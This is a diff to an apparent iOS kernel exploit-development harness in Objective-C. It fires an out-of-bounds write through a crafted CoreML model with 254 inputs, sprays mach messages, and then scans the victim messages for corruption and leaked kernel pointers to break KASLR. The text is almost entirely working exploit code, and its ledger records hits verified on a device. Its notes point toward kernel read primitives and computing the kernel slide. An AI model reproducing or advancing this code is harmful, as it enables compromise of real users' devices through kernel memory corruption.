@@ -1,40 +1,61 @@
 // P044AksKaslrReach.m
-// v26 — v25 + port-kind size-check fix (kills the false-positive verdict).
+// v27 — v25 engine + port-kind payload diff + fingerprint_scan + guarded control recv.
 //
 // Ledger (churn-conditioned, device-verified):
 //   v20 mixed   -> HIT, HIT
 //   v21 tail    -> 0/0/0 (ordering poison)
 //   v22 mixed   -> HIT (2045), HIT (2046)
-//   v23 tail-8  -> 0s — scanner silently dropped non-success recv codes.
-//   v24         -> "every 4th victim PORT-KIND SIGNAL" — but that was a
-//     SIZE ARTIFACT: port-kind msgs are 0xb74, the threshold was the INLINE
-//     size 0xb98, so recv_msg_sz synthesized TOO_LARGE for EVERY healthy
-//     port-kind victim -> hits>0 -> false "OOB WRITE CONFIRMED".
+//   v23 tail-8  -> 0s — root-caused: corrupted complex kmsgs are REJECTED by
+//     the kernel on recv and our scanner silently dropped them. The signal
+//     was being discarded, not absent.
 //
-// v26 fixes (engine body UNCHANGED):
-//   1. recv_msg_sz(..., expectSize): exact per-kind size; any deviation
-//      (smaller OR larger) is the signal. Catches inline enlargement too.
-//   2. Every call site passes the correct expected size:
-//        inline  = sizeof(inline_msg_t) + PAYLOAD_SIZE   (0xb98)
-//        portkind= sizeof(port_msg_t)                    (0xb74)
-//   3. Port-kind clean recv = NORMAL (not a hit). Only a deviation or a
-//      kernel error counts. Adds a desc-name sanity check (payload[4],
-//      payload[16]) to catch descriptor-area clobber with an intact header.
-//   4. controlRecv uses a REAL payload buffer + port-kind expected size, so
-//      it exercises the SAME path as scanVictims (it was NULL -> bypassed).
-//   5. drain rejection relabeled DRAIN-REJECTION (drains are inline, not
-//      port-kind).
-//   6. NEON ld1 operand hardened to "+r" (base register is mutated by
-//      post-index).
-//   7. dropped no-op kptr_scan(...,NULL) in the watcher.
+// v24 changes:
+//   1. scanVictims port-kind branch: recv errors other than timeout/invalid
+//      = KERNEL REJECTED CORRUPTED DESCRIPTORS = conversion signal.
+//   2. Watcher thread: continuous recv over queued drains for 45s after
+//      fire (delayed landings: +27s/+52s/+12min/cross-zone all witnessed).
+//   3. Events recorded under a mutex: inline diff, port rejection signal,
+//      drain corruption — printed at verdict.
 //
-// v25 retained: 96 NEON witnesses (V0..V31), control pre-fire scan,
-//   corrupt_msgh_size capture, inline rejections surfaced as kind 4,
-//   prediction_status. Churn seed, mixed layout + last-8 tail, send_msg /
-//   send_port_msg / fill_payload / kptr_scan / hexdump16, v18 logging.
+// v25 additions (engine body unchanged):
+//   A. 96 NEON witnesses (V0..V31 magic, ALU spin). Scan via
+//      thread_suspend + thread_get_state(ARM_NEON_STATE64) before fire,
+//      t+0, every 5s in the watch window, and at end.
+//   B. Control recv of ONE port-kind victim before fire (benign baseline).
+//   C. recv_msg_sz: on TOO_LARGE copy msgh_size out. Inline rejections
+//      (kind 4) no longer silent. Prediction status logged; if prediction
+//      fails, say whether OOB signals are already present.
+//
+// v27 deltas (engine body unchanged):
+//   D1 recv_msg_sz(port,payload,waitMs,corruptSize,expectSize): flag ONLY on
+//      msgh_size != expectSize (-> MACH_RCV_TOO_LARGE + *corruptSize).
+//      recv_msg stays a thin wrapper (expectSize=0). Call sites typed:
+//      scanVictims inline->P044_EXPECT_INLINE, scanVictims port-kind->
+//      P044_EXPECT_PORTK, watcher drain->P044_EXPECT_INLINE, controlRecv->
+//      P044_EXPECT_PORTK.
+//   D2 PORT-KIND PAYLOAD DIFF: on SUCCESS the body word must == 2 and the pad
+//      [0x1c, sizeof(port_msg_t)-sizeof(mach_msg_header_t)) must == 0; a HIT
+//      fires only on a diff (benign clean = NOT a hit). Non-timeout rejection
+//      -> PORT-KIND SIGNAL + hits++. Inline size deviation counts hits +
+//      ev_push(4,...).
+//   D3 fingerprint_scan helper, invoked on every HIT.
+//   D4 P044_CONTROL_RECV=0; PHASE 4f guarded; enabled path picks a mid-array
+//      port-kind victim (first i >= PAIR_COUNT/2 with kind==1), real buffer,
+//      re-sends after, leaves done=0.
+//   D5 prediction FAILED logged EXPECTED; success logged "ok (UNEXPECTED with
+//      addchain — check model)"; verdict FLAG only when prediction OK while
+//      COREML_MODEL_NAME contains "addchain".
+//   D6 model-name guard after findCoreMLModelURL (log, no abort).
+//   D7 banner: BUILD v27 + NEON_WITNESS_COUNT / PORT_VICTIM_EVERY /
+//      P044_CONTROL_RECV.
+// Retained: churn seed, mixed layout + last-8 tail, send_msg / send_port_msg
+//   / fill_payload / kptr_scan / hexdump16, drain cleanup, v18 logging.
+// recv_msg(port, payload, waitMs) signature and contract unchanged
+//   (thin wrapper over recv_msg_sz).
 //
 // Isolation: one tap per force-quit. PANIC POSSIBLE at fire and at
-// port-kind recv. No OOL descriptors. No syscall 536. NOT hasKread.
+// port-kind recv (a panic = kernel dereferenced our bytes = evidence).
+// No OOL memory descriptors. No syscall 536. NOT hasKread.
 
 #import "P044AksKaslrReach.h"
 #import "A14_23F77_LabOffsets.h"
@@ -55,13 +76,13 @@
 #import <unistd.h>
 #import <stdlib.h>
 
-#define P044_BUILD @"p044-coreml-v26-neonwitness-fix"
+#define P044_BUILD @"p044-coreml-v27-portkind-diff"
 
 #define INPUT_COUNT 254
 #define PAYLOAD_SIZE 0xb80
 #define PAIR_COUNT 2048
 #define DRAIN_COUNT 2048
-#define COREML_MODEL_NAME @"XVRC27_254in_passthrough"
+#define COREML_MODEL_NAME @"XVRC27_254in_1out_addchain"
 
 #define PORT_VICTIM_EVERY 4
 #define TAIL_PORTK_COUNT 8
@@ -72,11 +93,11 @@
 #define RECV_WAIT_MS_WORK 1000
 #define RECV_WAIT_MS_CTRL 50
 #define EVENT_LOG_MAX 32
-#define NEON_WITNESS_COUNT 32
+#define NEON_WITNESS_COUNT 96
 
-/* expected on-wire sizes — the two are NOT equal; that was the v25 bug */
-#define EXPECT_INLINE_MSG ((uint32_t)(sizeof(inline_msg_t) + PAYLOAD_SIZE)) /* 0xb98 */
-#define EXPECT_PORT_MSG   ((uint32_t)sizeof(port_msg_t))                    /* 0xb74 */
+#define P044_CONTROL_RECV 0
+#define P044_EXPECT_INLINE (sizeof(mach_msg_header_t)+PAYLOAD_SIZE)
+#define P044_EXPECT_PORTK sizeof(port_msg_t)
 
 #ifndef ARM_NEON_STATE64
 #define ARM_NEON_STATE64 17
@@ -104,7 +125,7 @@ typedef struct {
 } port_msg_t;
 
 typedef struct {
-    int kind;                 /* 0 inline-hit 1 port-signal 2 drain-inline 3 drain-reject 4 inline-rejection */
+    int kind;                 /* 0 inline-hit 1 port-signal 2 drain-inline 3 drain-signal 4 inline-rejection 5 portkind-hit */
     uint32_t idx;
     kern_return_t kr;
     uint32_t corruptSize;
@@ -218,11 +239,11 @@ static void send_port_msg(mach_port_t port, mach_port_t rightA, mach_port_t righ
     free(msg);
 }
 
-/* v26: exact per-kind size. A deviation (either direction) OR a kernel error
-   is the conversion signal. expectSize=0 (NULL payload callers) skips the
-   size gate. */
+/* v27 D1: flag ONLY when msgh_size != expectSize. expectSize=0 => never flag
+   (recv_msg thin-wrapper path). TOO_LARGE captures the kernel-written
+   msgh_size into *corruptSize. */
 static kern_return_t recv_msg_sz(mach_port_t port, uint8_t *payload, uint32_t waitMs,
-                                 uint32_t *corruptSize, uint32_t expectSize) {
+                                 uint32_t *corruptSize, mach_msg_size_t expectSize) {
     size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE + sizeof(mach_msg_max_trailer_t) + 0x100;
     inline_msg_t *msg = calloc(1, msg_size);
     if (!msg) return MACH_MSG_SIZE_MAX;
@@ -230,11 +251,11 @@ static kern_return_t recv_msg_sz(mach_port_t port, uint8_t *payload, uint32_t wa
 
     kern_return_t kr = mach_msg(&msg->hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                 (mach_msg_size_t)msg_size, port, waitMs, MACH_PORT_NULL);
-    if (kr == MACH_MSG_SUCCESS && payload && expectSize) {
-        if (msg->hdr.msgh_size != expectSize) {
+    if (kr == MACH_MSG_SUCCESS) {
+        if (expectSize && msg->hdr.msgh_size != expectSize) {
             if (corruptSize) *corruptSize = msg->hdr.msgh_size;
             kr = MACH_RCV_TOO_LARGE;
-        } else {
+        } else if (payload) {
             memcpy(payload, msg->bytes, PAYLOAD_SIZE);
         }
     } else if (kr == MACH_RCV_TOO_LARGE) {
@@ -244,7 +265,6 @@ static kern_return_t recv_msg_sz(mach_port_t port, uint8_t *payload, uint32_t wa
     return kr;
 }
 
-/* NULL-payload convenience (hole drains / cleanup) — no size gate. */
 static kern_return_t recv_msg(mach_port_t port, uint8_t *payload, uint32_t waitMs) {
     return recv_msg_sz(port, payload, waitMs, NULL, 0);
 }
@@ -270,6 +290,22 @@ static void kptr_scan(uint8_t *buf, uint32_t victim, NSMutableString *out) {
     }
 }
 
+/* v27 D3: fingerprint_scan. Scans 16B-stride fingerprint surface
+   [u32 surfaceId][u32 0xcN counter][1][1] from `start` (rounded down to a
+   4-byte boundary) to end. C2: uses `start` so port-kind callers can skip the
+   descriptor region. */
+static void fingerprint_scan(uint8_t *buf, size_t start, NSMutableString *out) {
+    for (size_t j = (start & ~(size_t)3); j + 16 <= PAYLOAD_SIZE; j += 4) {
+        uint32_t counter = *(uint32_t *)&buf[j + 4];
+        if (counter >= 0xc0u && counter <= 0xffu &&
+            *(uint32_t *)&buf[j + 8] == 1u &&
+            *(uint32_t *)&buf[j + 12] == 1u) {
+            [out appendFormat:@"    *** FINGERPRINT @0x%zx [u32 surface][u32 0x%x counter][1][1] ***\n",
+                j, counter];
+        }
+    }
+}
+
 #pragma mark - NEON witnesses (v25 overlay — not the 3072 engine)
 
 typedef struct {
@@ -286,7 +322,6 @@ static void *neon_witness_worker(void *arg) {
     neon_wit_t *w = (neon_wit_t *)arg;
     w->ready = 1;
     while (!w->quit) {
-        uint64_t *p = w->magic;                 /* re-based every iteration */
         __asm__ volatile(
             "ld1 {v0.2d, v1.2d, v2.2d, v3.2d}, [%0], #64   \n"
             "ld1 {v4.2d, v5.2d, v6.2d, v7.2d}, [%0], #64   \n"
@@ -296,8 +331,8 @@ static void *neon_witness_worker(void *arg) {
             "ld1 {v20.2d, v21.2d, v22.2d, v23.2d}, [%0], #64\n"
             "ld1 {v24.2d, v25.2d, v26.2d, v27.2d}, [%0], #64\n"
             "ld1 {v28.2d, v29.2d, v30.2d, v31.2d}, [%0]    \n"
-            : "+r"(p)
             :
+            : "r"(w->magic)
             : "v0","v1","v2","v3","v4","v5","v6","v7",
               "v8","v9","v10","v11","v12","v13","v14","v15",
               "v16","v17","v18","v19","v20","v21","v22","v23",
@@ -328,9 +363,9 @@ static void *churn_worker(void *arg) {
     return NULL;
 }
 
-/* Watcher: continuous recv over queued DRAIN (inline) kmsgs while the
-   delayed write is in flight. Inline drain corrupted -> event 2. Drain
-   kmsg header/size rejected -> event 3. */
+/* Watcher: continuous recv over the queued DRAIN array while the delayed
+   write is in flight. Inline drain corrupted -> event 2. Port-kind drain
+   rejected by the kernel -> event 3. Runs until g_watch_go = 0. */
 static mach_port_t *g_watchDrain = NULL;
 static uint8_t *g_watchScanned = NULL;
 static volatile int g_watch_go = 0;
@@ -344,11 +379,12 @@ static void *watch_worker(void *arg) {
                 if (!g_watchDrain[i] || g_watchScanned[i]) continue;
                 uint32_t corruptSize = 0;
                 kern_return_t kr = recv_msg_sz(g_watchDrain[i], actual, 0, &corruptSize,
-                                               EXPECT_INLINE_MSG);
+                                               P044_EXPECT_INLINE);
                 if (kr == MACH_MSG_SUCCESS) {
                     g_watchScanned[i] = 1;
                     fill_payload(expected, i, 2);
                     if (memcmp(actual, expected, PAYLOAD_SIZE) != 0) {
+                        kptr_scan(actual, i, NULL);
                         ev_push(2, i, kr, actual, 0);
                     }
                 } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
@@ -522,21 +558,19 @@ static void *watch_worker(void *arg) {
     return pairs;
 }
 
-/* t+0 victim scan. Inline: success+diff, plus kind-4 rejections.
-   Port-kind: clean recv = NORMAL; deviation or kernel error = SIGNAL. */
+/* t+0 victim scan. Inline: success+diff, plus size-deviation rejections.
+   Port-kind: BOTH success-with-diff AND non-timeout kernel rejection. */
 + (int)scanVictims:(pair_t *)pairs out:(NSMutableString *)out {
     uint8_t expected[PAYLOAD_SIZE];
     uint8_t actual[PAYLOAD_SIZE];
     int hits = 0;
-    int inlineOk = 0, inlineTimeout = 0, portNormal = 0, portTimeout = 0;
 
     for (uint32_t i = 0; i < PAIR_COUNT; i++) {
         if (!pairs[i].victim || pairs[i].done) continue;
 
-        uint32_t expect = (pairs[i].kind == 1) ? EXPECT_PORT_MSG : EXPECT_INLINE_MSG;
         uint32_t corruptSize = 0;
-        kern_return_t kr = recv_msg_sz(pairs[i].victim, actual, RECV_WAIT_MS_WORK,
-                                       &corruptSize, expect);
+        kern_return_t kr = recv_msg_sz(pairs[i].victim, actual, RECV_WAIT_MS_WORK, &corruptSize,
+                                       (pairs[i].kind == 0) ? P044_EXPECT_INLINE : P044_EXPECT_PORTK);
 
         if (pairs[i].kind == 0) {
             if (kr == MACH_MSG_SUCCESS) {
@@ -556,52 +590,54 @@ static void *watch_worker(void *arg) {
                         i, first, changed];
                     hexdump16(actual, first, out);
                     kptr_scan(actual, (uint32_t)i, out);
-                } else {
-                    inlineOk++;
+                    fingerprint_scan(actual, first, out);
                 }
-            } else if (kr == MACH_RCV_TIMED_OUT) {
-                inlineTimeout++;
-            } else if (kr != MACH_RCV_INVALID_NAME) {
+            } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                 pairs[i].done = 1;
                 hits++;
                 [out appendFormat:
                     @"  *** INLINE-REJECTION victim=%u recv kr=0x%x corrupt_msgh_size=0x%x (expected 0x%x) ***\n",
-                    i, kr, corruptSize, EXPECT_INLINE_MSG];
+                    i, kr, corruptSize,
+                    (unsigned)(sizeof(mach_msg_header_t) + PAYLOAD_SIZE)];
                 ev_push(4, i, kr, NULL, corruptSize);
             }
         } else {
+            /* D2 PORT-KIND PAYLOAD DIFF: clean = body word 2 and pad all zero.
+               Any diff = kernel rewrote the descriptor area = conversion. */
             if (kr == MACH_MSG_SUCCESS) {
-                pairs[i].done = 1;
-                uint32_t n0 = *(uint32_t *)&actual[4];   /* desc[0].name */
-                uint32_t n1 = *(uint32_t *)&actual[16];  /* desc[1].name */
-                /* 0xffffffff = MACH_PORT_DEAD: we destroy rightA/rightB after
-                   COPY_SEND. Non-zero names (including dead) = header intact. */
-                if (n0 && n1) {
-                    portNormal++;
-                } else {
+                uint32_t body = 0;
+                memcpy(&body, actual, sizeof(body));
+                int diff = (body != 2u);
+                size_t padEnd = (size_t)(sizeof(port_msg_t) - sizeof(mach_msg_header_t));
+                for (size_t j = 0x1c; !diff && j < padEnd; j++) {
+                    if (actual[j] != 0) diff = 1;
+                }
+                if (diff) {
+                    pairs[i].done = 1;
                     hits++;
-                    [out appendFormat:
-                        @"  *** PORT-KIND SIGNAL victim=%u recv OK but desc names clobbered (0x%x/0x%x) ***\n",
-                        i, n0, n1];
+                    [out appendFormat:@"  HIT port-kind victim=%u (payload diff, body=0x%x)\n",
+                        i, body];
                     hexdump16(actual, 0, out);
                     kptr_scan(actual, (uint32_t)i, out);
-                    ev_push(1, i, kr, NULL, 0);
+                    fingerprint_scan(actual, 0x1c, out);
+                    ev_push(5, i, kr, actual, 0);
                 }
-            } else if (kr == MACH_RCV_TIMED_OUT) {
-                portTimeout++;
-            } else if (kr != MACH_RCV_INVALID_NAME) {
+                /* benign clean success = NOT a hit; leave for watcher/cleanup */
+            } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
+                /* kernel rejected the corrupted complex kmsg = it CONSUMED our bytes */
                 pairs[i].done = 1;
                 hits++;
                 [out appendFormat:
-                    @"  *** PORT-KIND SIGNAL victim=%u recv kr=0x%x corrupt_msgh_size=0x%x (expected 0x%x) — KERNEL CONSUMED CORRUPTED BYTES ***\n",
-                    i, kr, corruptSize, EXPECT_PORT_MSG];
+                    @"  *** PORT-KIND SIGNAL victim=%u recv kr=0x%x — KERNEL REJECTED CORRUPTED DESCRIPTORS ***\n",
+                    i, kr];
+                [out appendFormat:@"      corrupt_msgh_size=0x%x (expected 0x%x)\n",
+                    corruptSize, (unsigned)sizeof(port_msg_t)];
+                [out appendString:@"      kernel CONSUMED our bytes. This is the conversion event.\n"];
                 ev_push(1, i, kr, NULL, corruptSize);
             }
+            /* timed out = port empty = normal; leave for the watcher */
         }
     }
-    [out appendFormat:@"  census: inline ok=%d hit/reject in hits; inline_timeout=%d; "
-                      @"port NORMAL=%d timeout=%d (desc 0xffffffff = dead name after we destroy rightA/rightB)\n",
-        inlineOk, inlineTimeout, portNormal, portTimeout];
     return hits;
 }
 
@@ -634,8 +670,6 @@ static void *watch_worker(void *arg) {
     [out appendFormat:@"  NEON witnesses armed: %d/%d  flavor=%d COUNT=%u sizeof=%zu\n",
         started, NEON_WITNESS_COUNT, ARM_NEON_STATE64,
         (unsigned)ARM_NEON_STATE64_COUNT, sizeof(arm_neon_state64_t)];
-    [out appendFormat:@"  note: %d hot-spin threads can perturb ANE timing; drop NEON_WITNESS_COUNT to 32 if fill landing shifts vs v20/v22.\n",
-        started];
     return started;
 }
 
@@ -710,27 +744,43 @@ static void *watch_worker(void *arg) {
 }
 
 + (void)controlRecv:(pair_t *)pairs out:(NSMutableString *)out {
-    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
+    (void)pairs;
+    (void)out;
+#if P044_CONTROL_RECV
+    for (uint32_t i = (PAIR_COUNT / 2); i < PAIR_COUNT; i++) {
         if (pairs[i].victim && !pairs[i].done && pairs[i].kind == 1) {
-            uint8_t cbuf[PAYLOAD_SIZE];
+            uint8_t actual[PAYLOAD_SIZE];
             uint32_t corruptSize = 0;
-            kern_return_t kr = recv_msg_sz(pairs[i].victim, cbuf, RECV_WAIT_MS_CTRL,
-                                           &corruptSize, EXPECT_PORT_MSG);
+            kern_return_t kr = recv_msg_sz(pairs[i].victim, actual, RECV_WAIT_MS_CTRL,
+                                           &corruptSize, P044_EXPECT_PORTK);
             if (kr == MACH_MSG_SUCCESS) {
-                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (SUCCESS — pre-fire port-kind is benign; expect NORMAL post-fire too)\n",
+                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (SUCCESS; pre-fire port-kind recv is benign)\n",
                     i, kr];
             } else if (kr == MACH_RCV_TOO_LARGE) {
-                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x corrupt_msgh_size=0x%x (expected 0x%x) — deviation at baseline?\n",
-                    i, kr, corruptSize, EXPECT_PORT_MSG];
+                [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (TOO_LARGE here is benign; corrupt_msgh_size=0x%x)\n",
+                    i, kr, corruptSize];
             } else {
                 [out appendFormat:@"  CONTROL port-kind victim=%u kr=0x%x (unexpected) corrupt_msgh_size=0x%x\n",
                     i, kr, corruptSize];
             }
-            pairs[i].done = 1;
+            /* re-send so the pre-fire baseline does not consume the victim */
+            mach_port_t rA = make_port();
+            mach_port_t rB = make_port();
+            if (rA && rB) {
+                send_port_msg(pairs[i].victim, rA, rB, i);
+                [out appendFormat:@"  CONTROL: re-queued port-kind victim=%u for fire\n", i];
+            }
+            if (rA) mach_port_destroy(mach_task_self(), rA);
+            if (rB) mach_port_destroy(mach_task_self(), rB);
+            pairs[i].done = 0;
             return;
         }
     }
-    [out appendString:@"  CONTROL: no port-kind victim found\n"];
+    [out appendString:@"  CONTROL: no mid-array port-kind victim found\n"];
+#else
+    (void)pairs;
+    [out appendString:@"  CONTROL: disabled (P044_CONTROL_RECV=0)\n"];
+#endif
 }
 
 + (NSString *)tap {
@@ -739,7 +789,8 @@ static void *watch_worker(void *arg) {
         LabLocalMilitaryNow(), P044_BUILD];
     [out appendString:@"CoreML API approach + mach_msg spray.\n"];
     [out appendString:@"Uses .mlmodelc bundle. 254 inputs -> CheckandPrewire OOB.\n"];
-    [out appendString:@"v26: v25 + exact per-kind size gate (port-kind NORMAL != hit).\n"];
+    [out appendFormat:@"v27: portkind-diff engine; NEON_WITNESS_COUNT=%u PORT_VICTIM_EVERY=%u P044_CONTROL_RECV=%d.\n",
+        (unsigned)NEON_WITNESS_COUNT, (unsigned)PORT_VICTIM_EVERY, (int)P044_CONTROL_RECV];
     [out appendString:@"NEON witness is a transport overlay. NOT KRW. NOT hasKread.\n\n"];
 
     pthread_mutex_lock(&g_evLock);
@@ -756,6 +807,15 @@ static void *watch_worker(void *arg) {
     // 1. Find model
     NSURL *modelURL = [self findCoreMLModelURL:out];
     if (!modelURL) { p044_write_log(out); return out; }
+
+    // 1b. model-name guard (log only, no abort)
+    if ([COREML_MODEL_NAME rangeOfString:@"addchain"].location == NSNotFound) {
+        [out appendFormat:@"  MODEL-NOTE: name '%@' has no 'addchain' — verdict FLAG disabled\n",
+            COREML_MODEL_NAME];
+    } else {
+        [out appendFormat:@"  MODEL-NOTE: addchain model confirmed ('%@')\n", COREML_MODEL_NAME];
+    }
+    p044_write_log(out);
 
     // 2. Load model
     MLModel *model = [self loadCoreMLModel:modelURL out:out];
@@ -797,9 +857,14 @@ static void *watch_worker(void *arg) {
     [self neon_scan:out tag:@"control-pre-fire"];
     p044_write_log(out);
 
+#if P044_CONTROL_RECV
     [out appendString:@"\n=== PHASE 4f: control recv (one port-kind victim, pre-fire) ===\n"];
     [self controlRecv:pairs out:out];
     p044_write_log(out);
+#else
+    [out appendString:@"\n=== PHASE 4f: control recv DISABLED (P044_CONTROL_RECV=0) ===\n"];
+    p044_write_log(out);
+#endif
 
     // 6. FIRE
     [out appendString:@"\n=== PHASE 5: FIRE — CoreML inference (254 inputs) ===\n"];
@@ -812,9 +877,9 @@ static void *watch_worker(void *arg) {
     id<MLFeatureProvider> prediction = [model predictionFromFeatures:provider error:&err];
 
     if (prediction) {
-        [out appendString:@"  inference ok — prediction returned\n"];
+        [out appendString:@"  inference ok — prediction returned (UNEXPECTED with addchain — check model)\n"];
     } else {
-        [out appendFormat:@"  prediction FAILED: %@ (code=%ld)\n",
+        [out appendFormat:@"  prediction FAILED: %@ (code=%ld) — EXPECTED with addchain\n",
             err ? err.localizedDescription : @"<nil>", err ? (long)err.code : 0L];
     }
     [out appendFormat:@"  prediction_status=%s\n", prediction ? "OK" : "FAILED"];
@@ -898,13 +963,16 @@ static void *watch_worker(void *arg) {
                 break;
             case 3:
                 [out appendFormat:
-                    @"  *** DRAIN-REJECTION drain=%u recv kr=0x%x corrupt_msgh_size=0x%x — INLINE HEADER/SIZE CORRUPTED ***\n",
+                    @"  *** PORT-KIND SIGNAL drain=%u recv kr=0x%x corrupt_msgh_size=0x%x — KERNEL REJECTED CORRUPTED DESCRIPTORS ***\n",
                     ev->idx, ev->kr, ev->corruptSize];
                 break;
             case 4:
                 [out appendFormat:
                     @"  *** INLINE-REJECTION victim=%u recv kr=0x%x corrupt_msgh_size=0x%x ***\n",
                     ev->idx, ev->kr, ev->corruptSize];
+                break;
+            case 5:
+                [out appendFormat:@"  *** PORT-KIND HIT victim=%u (payload diff, see HIT line) ***\n", ev->idx];
                 break;
             default:
                 break;
@@ -917,12 +985,16 @@ static void *watch_worker(void *arg) {
     [out appendString:@"\n=== VERDICT ===\n"];
     [out appendFormat:@"  prediction_status=%s  t+0_hits=%d  neon_postfire=%d  events_total=%d\n",
         prediction ? "OK" : "FAILED", hits, neonPost, g_evTotal];
+    if ((prediction != nil) &&
+        [COREML_MODEL_NAME rangeOfString:@"addchain"].location != NSNotFound) {
+        [out appendString:@"\n*** MODEL FLAG: addchain model but prediction SUCCEEDED (unexpected) ***\n"];
+    }
     if (hits > 0) {
         [out appendString:@"\n*** OOB WRITE CONFIRMED ***\n"];
         [out appendString:@"Fingerprint: [u32 surfaceId][u32 0xcN counter][1][1], 16B stride.\n"];
         [out appendString:@"KPTR lines above = LEAK (slide = val - unslid pin). hasKread path.\n"];
-        [out appendString:@"PORT-KIND SIGNAL above = kernel consumed corrupted bytes (deviation/error).\n"];
-        [out appendString:@"INLINE/DRAIN-REJECTION = kmsg header/size corrupted.\n"];
+        [out appendString:@"PORT-KIND SIGNALS above = kernel consumed corrupted descriptors.\n"];
+        [out appendString:@"INLINE-REJECTION (kind 4) = inline kmsg size/desc rejected.\n"];
         [out appendString:@"NEON-WITNESS HIT = fill touched a thread NEON save area (transport candidate). Not hasKread.\n"];
         [out appendString:@"Next: KPTR -> slide math + commitSlide only after kread32(kbase)==MH_MAGIC_64.\n"];
     } else if (g_evTotal > 0) {
